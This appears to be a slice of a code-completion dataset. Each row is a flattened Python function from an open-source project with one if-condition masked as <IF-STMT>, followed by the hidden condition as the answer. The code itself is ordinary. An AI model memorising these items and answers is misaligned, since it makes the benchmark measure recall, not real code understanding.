877,"def __getExpectedSampleOffsets(self, tileOrigin, area1, area2):<tab>ts = GafferImage.ImagePlug.tileSize()<tab>data = []<tab>for y in range(tileOrigin.y, tileOrigin.y + ts):<tab><tab>for x in range(tileOrigin.x, tileOrigin.x + ts):<tab><tab><tab>pixel = imath.V2i(x, y)<tab><tab><tab>data.append(data[-1] if data else 0)<tab><tab><tab>if GafferImage.BufferAlgo.contains(area1, pixel):<tab><tab><tab><tab>data[-1] += 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data[-1] += 1<tab>return IECore.IntVectorData(data)","if GafferImage . BufferAlgo . contains ( area2 , pixel ) :",190
878,"def test_doc_attributes(self):<tab>print_test_name(""TEST DOC ATTRIBUTES"")<tab>correct = 0<tab>for example in DOC_EXAMPLES:<tab><tab>original_schema = schema.parse(example.schema_string)<tab><tab><IF-STMT><tab><tab><tab>correct += 1<tab><tab>if original_schema.type == ""record"":<tab><tab><tab>for f in original_schema.fields:<tab><tab><tab><tab>if f.doc is None:<tab><tab><tab><tab><tab>self.fail(<tab><tab><tab><tab><tab><tab>""Failed to preserve 'doc' in fields: "" + example.schema_string<tab><tab><tab><tab><tab>)<tab>self.assertEqual(correct, len(DOC_EXAMPLES))",if original_schema . doc is not None :,168
879,"def enter(self, node, key, parent, path, ancestors):<tab>for i, visitor in enumerate(self.visitors):<tab><tab>if not self.skipping[i]:<tab><tab><tab>result = visitor.enter(node, key, parent, path, ancestors)<tab><tab><tab>if result is False:<tab><tab><tab><tab>self.skipping[i] = node<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.skipping[i] = BREAK<tab><tab><tab>elif result is not None:<tab><tab><tab><tab>return result",elif result is BREAK :,125
880,"def new_user_two_factor():<tab>user = Journalist.query.get(request.args[""uid""])<tab>if request.method == ""POST"":<tab><tab>token = request.form[""token""]<tab><tab><IF-STMT><tab><tab><tab>flash(<tab><tab><tab><tab>gettext(<tab><tab><tab><tab><tab>""Token in two-factor authentication "" ""accepted for user {user}.""<tab><tab><tab><tab>).format(user=user.username),<tab><tab><tab><tab>""notification"",<tab><tab><tab>)<tab><tab><tab>return redirect(url_for(""admin.index""))<tab><tab>else:<tab><tab><tab>flash(<tab><tab><tab><tab>gettext(""Could not verify token in two-factor authentication.""), ""error""<tab><tab><tab>)<tab>return render_template(""admin_new_user_two_factor.html"", user=user)",if user . verify_token ( token ) :,197
881,"def _check_locations(self, locations, available_locations):<tab>for location in locations:<tab><tab><IF-STMT><tab><tab><tab>self.log.warning(<tab><tab><tab><tab>""List of supported locations for you is: %s"",<tab><tab><tab><tab>sorted(available_locations.keys()),<tab><tab><tab>)<tab><tab><tab>raise TaurusConfigError(""Invalid location requested: %s"" % location)",if location not in available_locations :,98
882,"def find_best_layout_for_subplots(num_subplots):<tab>r, c = 1, 1<tab>while (r * c) < num_subplots:<tab><tab>if (c == (r + 1)) or (r == c):<tab><tab><tab>c += 1<tab><tab><IF-STMT><tab><tab><tab>r += 1<tab><tab><tab>c -= 1<tab>return r, c",elif c == ( r + 2 ) :,94
883,"def check_env(env):<tab>for name, val in env.items():<tab><tab>if not isinstance(name, six.string_types):<tab><tab><tab>raise ValueError(""non-string env name %r"" % name)<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""non-string env value for '%s': %r"" % (name, val))","if not isinstance ( val , six . string_types ) :",92
884,"def _indexes(self):<tab># used for index_lib<tab>indexes = []<tab>names = (""index"", ""columns"")<tab>for ax in range(self.input.ndim):<tab><tab>index = names[ax]<tab><tab>val = getattr(self, index)<tab><tab><IF-STMT><tab><tab><tab>indexes.append(val)<tab><tab>else:<tab><tab><tab>indexes.append(slice(None))<tab>return indexes",if val is not None :,103
885,"def gen():<tab>for _ in range(256):<tab><tab>if seq:<tab><tab><tab>yield self.tb.dut.i.eq(seq.pop(0))<tab><tab>i = yield self.tb.dut.i<tab><tab>if (yield self.tb.dut.n):<tab><tab><tab>self.assertEqual(i, 0)<tab><tab>else:<tab><tab><tab>o = yield self.tb.dut.o<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.assertEqual(i & 1 << (o - 1), 0)<tab><tab><tab>self.assertGreaterEqual(i, 1 << o)<tab><tab>yield",if o > 0 :,149
886,"def early_version(self, argv):<tab>if ""--version"" in argv:<tab><tab><IF-STMT><tab><tab><tab>from flower.utils import bugreport<tab><tab><tab>print(bugreport(), file=self.stdout)<tab><tab>print(__version__, file=self.stdout)<tab><tab>super(FlowerCommand, self).early_version(argv)","if ""--debug"" in argv :",85
887,"def _lookup(self, key, dicts=None, filters=()):<tab>if dicts is None:<tab><tab>dicts = self.dicts<tab>key_len = len(key)<tab>if key_len > self.longest_key:<tab><tab>return None<tab>for d in dicts:<tab><tab>if not d.enabled:<tab><tab><tab>continue<tab><tab>if key_len > d.longest_key:<tab><tab><tab>continue<tab><tab>value = d.get(key)<tab><tab><IF-STMT><tab><tab><tab>for f in filters:<tab><tab><tab><tab>if f(key, value):<tab><tab><tab><tab><tab>return None<tab><tab><tab>return value",if value :,150
888,"def get_lang3(lang):<tab>try:<tab><tab>if len(lang) == 2:<tab><tab><tab>ret_value = get(part1=lang).part3<tab><tab><IF-STMT><tab><tab><tab>ret_value = lang<tab><tab>else:<tab><tab><tab>ret_value = """"<tab>except KeyError:<tab><tab>ret_value = lang<tab>return ret_value",elif len ( lang ) == 3 :,94
889,"def get_config_settings():<tab>config = {}<tab>for plugin in extension_loader.MANAGER.plugins:<tab><tab>fn_name = plugin.name<tab><tab>function = plugin.plugin<tab><tab># if a function takes config...<tab><tab>if hasattr(function, ""_takes_config""):<tab><tab><tab>fn_module = importlib.import_module(function.__module__)<tab><tab><tab># call the config generator if it exists<tab><tab><tab><IF-STMT><tab><tab><tab><tab>config[fn_name] = fn_module.gen_config(function._takes_config)<tab>return yaml.safe_dump(config, default_flow_style=False)","if hasattr ( fn_module , ""gen_config"" ) :",161
890,"def _import_pathname(self, pathname, fqname):<tab>if _os_path_isdir(pathname):<tab><tab>result = self._import_pathname(_os_path_join(pathname, ""__init__""), fqname)<tab><tab><IF-STMT><tab><tab><tab>values = result[2]<tab><tab><tab>values[""__pkgdir__""] = pathname<tab><tab><tab>values[""__path__""] = [pathname]<tab><tab><tab>return 1, result[1], values<tab><tab>return None<tab>for suffix, importFunc in self.suffixes:<tab><tab>filename = pathname + suffix<tab><tab>try:<tab><tab><tab>finfo = _os_stat(filename)<tab><tab>except OSError:<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>return importFunc(filename, finfo, fqname)<tab>return None",if result :,180
891,def __iter__(self):<tab>with self._guard:<tab><tab>for dp in self.ds:<tab><tab><tab>shp = dp[self.idx].shape<tab><tab><tab>holder = self.holder[shp]<tab><tab><tab>holder.append(dp)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield BatchData.aggregate_batch(holder)<tab><tab><tab><tab>del holder[:],if len ( holder ) == self . batch_size :,98
892,"def add_data_source(self, f=None, s_name=None, source=None, module=None, section=None):<tab>try:<tab><tab>if module is None:<tab><tab><tab>module = self.name<tab><tab>if section is None:<tab><tab><tab>section = ""all_sections""<tab><tab><IF-STMT><tab><tab><tab>s_name = f[""s_name""]<tab><tab>if source is None:<tab><tab><tab>source = os.path.abspath(os.path.join(f[""root""], f[""fn""]))<tab><tab>report.data_sources[module][section][s_name] = source<tab>except AttributeError:<tab><tab>logger.warning(<tab><tab><tab>""Tried to add data source for {}, but was missing fields data"".format(<tab><tab><tab><tab>self.name<tab><tab><tab>)<tab><tab>)",if s_name is None :,198
893,"def forward(self, seq, adj, sparse=False):<tab>seq_fts = self.fc(seq)<tab>if len(seq_fts.shape) > 2:<tab><tab><IF-STMT><tab><tab><tab>out = torch.unsqueeze(torch.spmm(adj, torch.squeeze(seq_fts, 0)), 0)<tab><tab>else:<tab><tab><tab>out = torch.bmm(adj, seq_fts)<tab>else:<tab><tab>if sparse:<tab><tab><tab>out = torch.spmm(adj, torch.squeeze(seq_fts, 0))<tab><tab>else:<tab><tab><tab>out = torch.mm(adj, seq_fts)<tab>if self.bias is not None:<tab><tab>out += self.bias<tab>return self.act(out)",if sparse :,183
894,"def stat(self, path):<tab>""""""Get attributes of a file or directory, following symlinks""""""<tab>try:<tab><tab>return SFTPAttrs.from_local(super().stat(path))<tab>except OSError as exc:<tab><tab><IF-STMT><tab><tab><tab>raise SFTPError(FX_PERMISSION_DENIED, exc.strerror)<tab><tab>else:<tab><tab><tab>raise SFTPError(FX_FAILURE, exc.strerror)",if exc . errno == errno . EACCES :,111
895,"def _run_eagerly(*inputs):  # pylint: disable=missing-docstring<tab>with context.eager_mode():<tab><tab>constants = [<tab><tab><tab>_wrap_as_constant(value, tensor_spec)<tab><tab><tab>for value, tensor_spec in zip(inputs, input_signature)<tab><tab>]<tab><tab>output = fn(*constants)<tab><tab><IF-STMT><tab><tab><tab>return output._make([tensor.numpy() for tensor in output])<tab><tab>if isinstance(output, (tuple, list)):<tab><tab><tab>return [tensor.numpy() for tensor in output]<tab><tab>else:<tab><tab><tab>return output.numpy()","if hasattr ( output , ""_make"" ) :",153
896,"def do_draw(self, data):<tab>if cu.biased_coin(data, self.__p):<tab><tab>return data.draw(self) + data.draw(self)<tab>else:<tab><tab># We draw n as two separate calls so that it doesn't show up as a<tab><tab># single block. If it did, the heuristics that allow us to move<tab><tab># blocks around would fire and it would move right, which would<tab><tab># then allow us to shrink it more easily.<tab><tab>n = (data.draw_bits(16) << 16) | data.draw_bits(16)<tab><tab><IF-STMT><tab><tab><tab>return (POISON,)<tab><tab>else:<tab><tab><tab>return (None,)",if n == MAX_INT :,172
897,"def object_matches_a_check(obj, checks):<tab>""""""Does the object match *any* of the given checks from the ""only_cache_matching"" list?""""""<tab>for check in checks:<tab><tab><IF-STMT><tab><tab><tab>if check(obj):<tab><tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>try:<tab><tab><tab><tab>for field, value in check.items():<tab><tab><tab><tab><tab>if not getattr(obj, field) == value:<tab><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>return True<tab><tab><tab>except AttributeError:<tab><tab><tab><tab>logger.error(""Invalid filter for model %s, %s"", obj.__class__, check)<tab><tab><tab><tab>raise<tab>return False",if callable ( check ) :,177
898,"def handle_edge(self, src_id, dst_id, attrs):<tab>try:<tab><tab>pos = attrs[""pos""]<tab>except KeyError:<tab><tab>return<tab>points = self.parse_edge_pos(pos)<tab>shapes = []<tab>for attr in (""_draw_"", ""_ldraw_"", ""_hdraw_"", ""_tdraw_"", ""_hldraw_"", ""_tldraw_""):<tab><tab><IF-STMT><tab><tab><tab>parser = XDotAttrParser(self, attrs[attr])<tab><tab><tab>shapes.extend(parser.parse())<tab>if shapes:<tab><tab>src = self.node_by_name[src_id]<tab><tab>dst = self.node_by_name[dst_id]<tab><tab>self.edges.append(elements.Edge(src, dst, points, shapes, attrs.get(""tooltip"")))",if attr in attrs :,191
899,"def get_available_data_asset_names(self):<tab>known_assets = []<tab>if not os.path.isdir(self.base_directory):<tab><tab>return {""names"": [(asset, ""path"") for asset in known_assets]}<tab>for data_asset_name in self.asset_globs.keys():<tab><tab>batch_paths = self._get_data_asset_paths(data_asset_name=data_asset_name)<tab><tab><IF-STMT><tab><tab><tab>known_assets.append(data_asset_name)<tab>return {""names"": [(asset, ""path"") for asset in known_assets]}",if len ( batch_paths ) > 0 and data_asset_name not in known_assets :,162
900,"def _maintain_pool(self):<tab>waiting = self._docker_interface.services_waiting_by_constraints()<tab>active = self._docker_interface.nodes_active_by_constraints()<tab>for constraints, needed_dict in self._state.slots_needed(waiting, active).items():<tab><tab>services = needed_dict[""services""]<tab><tab>nodes = needed_dict[""nodes""]<tab><tab>slots_needed = needed_dict[""slots_needed""]<tab><tab><IF-STMT><tab><tab><tab>self._spawn_nodes(constraints, services, slots_needed)<tab><tab>elif slots_needed < 0:<tab><tab><tab>self._destroy_nodes(constraints, nodes, slots_needed)",if slots_needed > 0 :,164
901,"def retention_validator(ns):<tab>if ns.backup_retention is not None:<tab><tab>val = ns.backup_retention<tab><tab><IF-STMT><tab><tab><tab>raise CLIError(<tab><tab><tab><tab>""incorrect usage: --backup-retention. Range is 7 to 35 days.""<tab><tab><tab>)",if not 7 <= int ( val ) <= 35 :,81
902,"def write(path, data, kind=""OTHER"", dohex=0):<tab>asserttype1(data)<tab>kind = string.upper(kind)<tab>try:<tab><tab>os.remove(path)<tab>except os.error:<tab><tab>pass<tab>err = 1<tab>try:<tab><tab>if kind == ""LWFN"":<tab><tab><tab>writelwfn(path, data)<tab><tab><IF-STMT><tab><tab><tab>writepfb(path, data)<tab><tab>else:<tab><tab><tab>writeother(path, data, dohex)<tab><tab>err = 0<tab>finally:<tab><tab>if err and not DEBUG:<tab><tab><tab>try:<tab><tab><tab><tab>os.remove(path)<tab><tab><tab>except os.error:<tab><tab><tab><tab>pass","elif kind == ""PFB"" :",182
903,"def __init__(self, zone, poll_interval=1):<tab>self.zone = zone<tab>self.poll_interval = poll_interval<tab>self.queue_client = QueueClient(zone)<tab>self.shards = []<tab>for database in config[""DATABASE_HOSTS""]:<tab><tab><IF-STMT><tab><tab><tab>shard_ids = [shard[""ID""] for shard in database[""SHARDS""]]<tab><tab><tab>self.shards.extend(<tab><tab><tab><tab>shard_id for shard_id in shard_ids if shard_id in engine_manager.engines<tab><tab><tab>)","if database . get ( ""ZONE"" ) == self . zone :",143
904,"def _postprocess_message(self, msg):<tab>if msg[""type""] != ""param"":<tab><tab>return<tab>event_dim = msg[""kwargs""].get(""event_dim"")<tab>if event_dim is None:<tab><tab>return<tab>for frame in msg[""cond_indep_stack""]:<tab><tab><IF-STMT><tab><tab><tab>value = msg[""value""]<tab><tab><tab>event_dim += value.unconstrained().dim() - value.dim()<tab><tab><tab>value.unconstrained()._pyro_dct_dim = frame.dim - event_dim<tab><tab><tab>return",if frame . name == self . name :,140
905,"def RemoveIdleHandler(self):<tab>if self.idleHandlerSet:<tab><tab>debug(""Idle handler reset\n"")<tab><tab><IF-STMT><tab><tab><tab>debug(""Error deleting idle handler\n"")<tab><tab>self.idleHandlerSet = 0",if win32ui . GetApp ( ) . DeleteIdleHandler ( self . QueueIdleHandler ) == 0 :,75
906,"def folder_is_public(self, folder):<tab>for sub_folder in folder.folders:<tab><tab>if not self.folder_is_public(sub_folder):<tab><tab><tab>return False<tab>for library_dataset in folder.datasets:<tab><tab>ldda = library_dataset.library_dataset_dataset_association<tab><tab><IF-STMT><tab><tab><tab>return False<tab>return True",if ldda and ldda . dataset and not self . dataset_is_public ( ldda . dataset ) :,115
907,"def _error_check(self, command_response):<tab>error = command_response.get(""error"")<tab>if error:<tab><tab>command = command_response.get(""command"")<tab><tab><IF-STMT><tab><tab><tab>raise NXAPICommandError(command, error[""data""][""msg""])<tab><tab>else:<tab><tab><tab>raise NXAPICommandError(command, ""Invalid command."")","if ""data"" in error :",90
908,"def find_idx_impl(arr, idx):<tab>chunks = parallel_chunks(len(arr))<tab>new_arr = [List.empty_list(types.int64) for i in range(len(chunks))]<tab>for i in prange(len(chunks)):<tab><tab>chunk = chunks[i]<tab><tab>for j in range(chunk.start, chunk.stop):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>new_arr[i].append(j)<tab>return new_arr",if arr [ j ] == idx :,121
909,"def _l2bytes(l):<tab># Convert a list of ints to bytes if the interpreter is Python 3<tab>try:<tab><tab><IF-STMT><tab><tab><tab># In Python 2.6 and above, this call won't raise an exception<tab><tab><tab># but it will return bytes([65]) as '[65]' instead of 'A'<tab><tab><tab>return bytes(l)<tab><tab>raise NameError<tab>except NameError:<tab><tab>return """".join(map(chr, l))",if bytes is not str :,112
910,"def decode(self):<tab>while True:<tab><tab># Sample data bits on falling clock edge.<tab><tab>(clock_pin, data_pin) = self.wait({0: ""f""})<tab><tab>self.handle_bits(data_pin)<tab><tab><IF-STMT><tab><tab><tab>(clock_pin, data_pin) = self.wait({0: ""r""})<tab><tab><tab>self.handle_bits(data_pin)",if self . bitcount == 11 :,106
911,"def letterrange(first, last, charset):<tab>for k in range(len(last)):<tab><tab>for x in product(*[chain(charset)] * (k + 1)):<tab><tab><tab>result = """".join(x)<tab><tab><tab>if first:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>first = None<tab><tab><tab>yield result<tab><tab><tab>if result == last:<tab><tab><tab><tab>return",if first != result :,112
912,"def run(self):<tab>while not self._stop:<tab><tab>for i in range(0, self._interval):<tab><tab><tab>time.sleep(1)<tab><tab><tab>if self._stop:<tab><tab><tab><tab>self.__logger.debug(""%s - ping thread stopped"" % self.name)<tab><tab><tab><tab>return<tab><tab>ping = PingIqProtocolEntity()<tab><tab>self._layer.waitPong(ping.getId())<tab><tab><IF-STMT><tab><tab><tab>self._layer.sendIq(ping)",if not self . _stop :,126
913,"def __init__(self):<tab>self.converters = dict()<tab>for p in dir(self):<tab><tab>attr = getattr(self, p)<tab><tab><IF-STMT><tab><tab><tab>for p in attr._converter_for:<tab><tab><tab><tab>self.converters[p] = attr","if hasattr ( attr , ""_converter_for"" ) :",74
914,"def consume(self):<tab>if not self.inputState.guessing:<tab><tab>c = self.LA(1)<tab><tab>if self.caseSensitive:<tab><tab><tab>self.append(c)<tab><tab>else:<tab><tab><tab># use input.LA(), not LA(), to get original case<tab><tab><tab># CharScanner.LA() would toLower it.<tab><tab><tab>c = self.inputState.input.LA(1)<tab><tab><tab>self.append(c)<tab><tab><IF-STMT><tab><tab><tab>self.tab()<tab><tab>else:<tab><tab><tab>self.inputState.column += 1<tab>self.inputState.input.consume()","if c and c in ""\t"" :",159
915,"def _is_target_pattern_matched(self, pattern, targets):<tab>for target in targets:<tab><tab>try:<tab><tab><tab>search_result = re.search(pattern, target)<tab><tab>except:<tab><tab><tab>logger.warning(<tab><tab><tab><tab>f""Illegal regular match in mock data!\n {traceback.format_exc()}""<tab><tab><tab>)<tab><tab><tab>return False<tab><tab><IF-STMT><tab><tab><tab>return False<tab>return True",if not search_result :,110
916,"def forwards(self, orm):<tab>from sentry.models import ProjectKey<tab>for project in orm[""sentry.Project""].objects.all():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>orm[""sentry.ProjectKey""].objects.create(<tab><tab><tab>project=project,<tab><tab><tab>public_key=ProjectKey.generate_api_key(),<tab><tab><tab>secret_key=ProjectKey.generate_api_key(),<tab><tab>)","if orm [ ""sentry.ProjectKey"" ] . objects . filter ( project = project , user = None ) . exists ( ) :",126
917,"def prepare_content_length(self, body):<tab>if hasattr(body, ""seek"") and hasattr(body, ""tell""):<tab><tab>curr_pos = body.tell()<tab><tab>body.seek(0, 2)<tab><tab>end_pos = body.tell()<tab><tab>self.headers[""Content-Length""] = builtin_str(max(0, end_pos - curr_pos))<tab><tab>body.seek(curr_pos, 0)<tab>elif body is not None:<tab><tab>l = super_len(body)<tab><tab><IF-STMT><tab><tab><tab>self.headers[""Content-Length""] = builtin_str(l)<tab>elif (self.method not in (""GET"", ""HEAD"")) and (<tab><tab>self.headers.get(""Content-Length"") is None<tab>):<tab><tab>self.headers[""Content-Length""] = ""0""",if l :,198
918,"def listdir(path="".""):<tab>is_bytes = isinstance(path, bytes)<tab>res = []<tab>for dirent in ilistdir(path):<tab><tab>fname = dirent[0]<tab><tab><IF-STMT><tab><tab><tab>good = fname != b""."" and fname == b""..""<tab><tab>else:<tab><tab><tab>good = fname != ""."" and fname != ""..""<tab><tab>if good:<tab><tab><tab>if not is_bytes:<tab><tab><tab><tab>fname = fsdecode(fname)<tab><tab><tab>res.append(fname)<tab>return res",if is_bytes :,128
919,"def _validate_mappings(self):<tab># Validate mapping references<tab>for m in self.mapping.mapping_rules:<tab><tab>for policy_id in m.policy_ids:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ReferencedObjectNotFoundError(<tab><tab><tab><tab><tab>reference_id=policy_id, reference_type=""policy""<tab><tab><tab><tab>)<tab><tab>for w in m.whitelist_ids:<tab><tab><tab>if w not in self.whitelists:<tab><tab><tab><tab>raise ReferencedObjectNotFoundError(<tab><tab><tab><tab><tab>reference_id=w, reference_type=""whitelist""<tab><tab><tab><tab>)",if policy_id not in self . policies :,155
920,"def get_field_by_name(obj, field):<tab># Dereference once<tab>if obj.type.code == gdb.TYPE_CODE_PTR:<tab><tab>obj = obj.dereference()<tab>for f in re.split(""(->|\.|\[\d+\])"", field):<tab><tab>if not f:<tab><tab><tab>continue<tab><tab>if f == ""->"":<tab><tab><tab>obj = obj.dereference()<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>elif f.startswith(""[""):<tab><tab><tab>n = int(f.strip(""[]""))<tab><tab><tab>obj = obj.cast(obj.dereference().type.pointer())<tab><tab><tab>obj += n<tab><tab><tab>obj = obj.dereference()<tab><tab>else:<tab><tab><tab>obj = obj[f]<tab>return obj","elif f == ""."" :",189
921,"def sendall(self, data):<tab>len_data = len(data)<tab>os_write = os.write<tab>fileno = self._fileno<tab>try:<tab><tab>total_sent = os_write(fileno, data)<tab>except OSError as e:<tab><tab><IF-STMT><tab><tab><tab>raise IOError(*e.args)<tab><tab>total_sent = 0<tab>while total_sent < len_data:<tab><tab>self._trampoline(self, write=True)<tab><tab>try:<tab><tab><tab>total_sent += os_write(fileno, data[total_sent:])<tab><tab>except OSError as e:<tab><tab><tab>if get_errno(e) != errno.EAGAIN:<tab><tab><tab><tab>raise IOError(*e.args)",if get_errno ( e ) != errno . EAGAIN :,189
922,"def dr_relation(self, C, trans, nullable):<tab>state, N = trans<tab>terms = []<tab>g = self.lr0_goto(C[state], N)<tab>for p in g:<tab><tab><IF-STMT><tab><tab><tab>a = p.prod[p.lr_index + 1]<tab><tab><tab>if a in self.grammar.Terminals:<tab><tab><tab><tab>if a not in terms:<tab><tab><tab><tab><tab>terms.append(a)<tab># This extra bit is to handle the start state<tab>if state == 0 and N == self.grammar.Productions[0].prod[0]:<tab><tab>terms.append(""$end"")<tab>return terms",if p . lr_index < p . len - 1 :,167
923,"def canonical_standard_headers(self, headers):<tab>interesting_headers = [""content-md5"", ""content-type"", ""date""]<tab>hoi = []<tab>if ""Date"" in headers:<tab><tab>del headers[""Date""]<tab>headers[""Date""] = self._get_date()<tab>for ih in interesting_headers:<tab><tab>found = False<tab><tab>for key in headers:<tab><tab><tab>lk = key.lower()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>hoi.append(headers[key].strip())<tab><tab><tab><tab>found = True<tab><tab>if not found:<tab><tab><tab>hoi.append("""")<tab>return ""\n"".join(hoi)",if headers [ key ] is not None and lk == ih :,172
924,"def _fatal_error(self, exc, message=""Fatal error on pipe transport""):<tab>try:<tab><tab>if isinstance(exc, OSError):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>logger.debug(""%r: %s"", self, message, exc_info=True)<tab><tab>else:<tab><tab><tab>self._loop.call_exception_handler(<tab><tab><tab><tab>{<tab><tab><tab><tab><tab>""message"": message,<tab><tab><tab><tab><tab>""exception"": exc,<tab><tab><tab><tab><tab>""transport"": self,<tab><tab><tab><tab><tab>""protocol"": self._protocol,<tab><tab><tab><tab>}<tab><tab><tab>)<tab>finally:<tab><tab>self._force_close(exc)",if self . _loop . get_debug ( ) :,167
925,"def match_empty(self, el):<tab>""""""Check if element is empty (if requested).""""""<tab>is_empty = True<tab>for child in self.get_children(el, tags=False):<tab><tab><IF-STMT><tab><tab><tab>is_empty = False<tab><tab><tab>break<tab><tab>elif self.is_content_string(child) and RE_NOT_EMPTY.search(child):<tab><tab><tab>is_empty = False<tab><tab><tab>break<tab>return is_empty",if self . is_tag ( child ) :,117
926,"def _sortNodes(self, nodes, sortBy, sortDir, force=False):<tab>if force or self._sortedBy != sortBy or self._sortDir != sortDir:<tab><tab>log.debug(""KPFTree::_sortNodes()"")<tab><tab><IF-STMT><tab><tab><tab>nodes.sort(lambda a, b: compareNodeFolder(a, b, sortBy, sortDir))<tab><tab>else:<tab><tab><tab>nodes.sort(lambda a, b: compareNode(a, b, sortBy))<tab><tab>self._sortDir = sortDir  # cache sort order<tab><tab>self._sortedBy = sortBy  # cache sort order<tab>else:<tab><tab>log.debug(""KPFTree::_sortNodes:: already sorted"")",if sortDir != 0 :,174
927,"def log(self, request):<tab>web_socket = WebSocketResponse()<tab>await web_socket.prepare(request)<tab>self.app[""websockets""].add(web_socket)<tab>try:<tab><tab>async for msg in web_socket:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if msg.data == ""close"":<tab><tab><tab><tab><tab>await web_socket.close()<tab><tab><tab>elif msg.type == WSMsgType.ERROR:<tab><tab><tab><tab>print(<tab><tab><tab><tab><tab>""web socket connection closed with exception %s""<tab><tab><tab><tab><tab>% web_socket.exception()<tab><tab><tab><tab>)<tab>finally:<tab><tab>self.app[""websockets""].remove(web_socket)<tab>return web_socket",if msg . type == WSMsgType . TEXT :,187
928,"def analyze_items(items, category_id, agg_data):<tab>for item in items:<tab><tab>if not agg_data[""cat_asp""].get(category_id, None):<tab><tab><tab>agg_data[""cat_asp""][category_id] = []<tab><tab>agg_data[""cat_asp""][category_id].append(<tab><tab><tab>float(item.sellingStatus.currentPrice.value)<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>agg_data[""watch_count""] += int(item.listingInfo.watchCount)<tab><tab>if getattr(item, ""postalCode"", None):<tab><tab><tab>agg_data[""postal_code""] = item.postalCode","if getattr ( item . listingInfo , ""watchCount"" , None ) :",169
929,"def __init__(<tab>self,<tab>filename,<tab>metadata_name,<tab>metadata_column,<tab>message=""Value for metadata not found."",<tab>line_startswith=None,<tab>split=""\t"",):<tab>self.metadata_name = metadata_name<tab>self.message = message<tab>self.valid_values = []<tab>for line in open(filename):<tab><tab><IF-STMT><tab><tab><tab>fields = line.split(split)<tab><tab><tab>if metadata_column < len(fields):<tab><tab><tab><tab>self.valid_values.append(fields[metadata_column].strip())",if line_startswith is None or line . startswith ( line_startswith ) :,150
930,"def iter_flat(self):<tab>for f in self.layout:<tab><tab>e = getattr(self, f[0])<tab><tab>if isinstance(e, Signal):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield e, f[2]<tab><tab><tab>else:<tab><tab><tab><tab>yield e, DIR_NONE<tab><tab>elif isinstance(e, Record):<tab><tab><tab>yield from e.iter_flat()<tab><tab>else:<tab><tab><tab>raise TypeError",if len ( f ) == 3 :,115
931,"def shell(self, cmd):<tab>if self._debug:<tab><tab>logger.log(cmd)<tab>if is_sequence(cmd):<tab><tab>cmd = """".join(cmd)<tab>if self._log:<tab><tab><IF-STMT><tab><tab><tab>cmd = ""(%s) 2>&1 | tee '%s'"" % (cmd, self._log)<tab><tab>else:<tab><tab><tab>cmd = ""(%s) >> '%s' 2>&1"" % (cmd, self._log)<tab>returncode = subprocess.call(cmd, shell=True, cwd=self._cwd)<tab>if returncode:<tab><tab>raise ShellCommandException(""%s: failed to `%s`"" % (returncode, cmd))",if self . _verbose :,159
932,"def _to_sentences(self, lines):<tab>text = """"<tab>sentence_objects = []<tab>for line in lines:<tab><tab>if isinstance(line, Sentence):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sentences = self.tokenize_sentences(text)<tab><tab><tab><tab>sentence_objects += map(self._to_sentence, sentences)<tab><tab><tab>sentence_objects.append(line)<tab><tab><tab>text = """"<tab><tab>else:<tab><tab><tab>text += "" "" + line<tab>text = text.strip()<tab>if text:<tab><tab>sentences = self.tokenize_sentences(text)<tab><tab>sentence_objects += map(self._to_sentence, sentences)<tab>return sentence_objects",if text :,164
933,"def _get_editable_fields(cls):<tab>fds = set([])<tab>for field in cls._meta.concrete_fields:<tab><tab>if hasattr(field, ""attname""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>elif field.attname.endswith(""ptr_id""):<tab><tab><tab><tab># polymorphic fields should always be non-editable, see:<tab><tab><tab><tab># https://github.com/django-polymorphic/django-polymorphic/issues/349<tab><tab><tab><tab>continue<tab><tab><tab>if getattr(field, ""editable"", True):<tab><tab><tab><tab>fds.add(field.attname)<tab>return fds","if field . attname == ""id"" :",159
934,"def get_router_id(path, local_bgp_id):<tab>path_source = path.source<tab>if path_source is None:<tab><tab>return local_bgp_id<tab>else:<tab><tab>originator_id = path.get_pattr(BGP_ATTR_TYPE_ORIGINATOR_ID)<tab><tab><IF-STMT><tab><tab><tab>return originator_id.value<tab><tab>return path_source.protocol.recv_open_msg.bgp_identifier",if originator_id :,115
935,"def visit_SelectionSetNode(self, node):<tab>elements = []<tab>for sel in node.selections:<tab><tab>if not self._should_include(sel.directives):<tab><tab><tab>continue<tab><tab>spec = self.visit(sel)<tab><tab><IF-STMT><tab><tab><tab>elements.append(spec)<tab>elements = self.combine_field_results(elements)<tab>return elements",if spec is not None :,94
936,"def update_groups_of_conv(self):<tab>for op in self.ops():<tab><tab><IF-STMT><tab><tab><tab>op.set_attr(""groups"", op.inputs(""Filter"")[0].shape()[0])","if op . type ( ) == ""depthwise_conv2d"" or op . type ( ) == ""depthwise_conv2d_grad"" :",76
937,"def init_constraints(self, batch_constraints: Optional[Tensor], beam_size: int):<tab>self.constraint_states = []<tab>for constraint_tensor in batch_constraints:<tab><tab>if self.representation == ""ordered"":<tab><tab><tab>constraint_state = OrderedConstraintState.create(constraint_tensor)<tab><tab><IF-STMT><tab><tab><tab>constraint_state = UnorderedConstraintState.create(constraint_tensor)<tab><tab>self.constraint_states.append([constraint_state for i in range(beam_size)])","elif self . representation == ""unordered"" :",125
